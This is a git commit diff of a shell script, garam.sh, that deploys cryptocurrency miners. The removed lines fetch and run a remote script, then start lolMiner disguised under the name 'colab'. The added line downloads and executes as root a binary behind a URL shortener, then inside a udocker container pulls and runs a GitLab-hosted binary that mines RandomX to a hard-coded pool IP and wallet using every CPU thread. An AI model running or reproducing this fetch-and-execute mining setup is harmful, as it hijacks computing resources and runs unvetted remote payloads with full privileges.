2dfe19ceb2bfe72abf5002913409d68eba7b3d47
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-07-19 21:50:28 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -1,13 +1,4 @@
 #!/bin/bash
 sudo su <<EOF
-wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
-apt-get -y install screen && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xvf lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && mv lolMiner colab
+wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) '
 EOF
-
-screen
-
-
-./1.81/colab --algo PYRIN --pool 47.236.130.246:80 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --pass x --no-cl
-
-
-
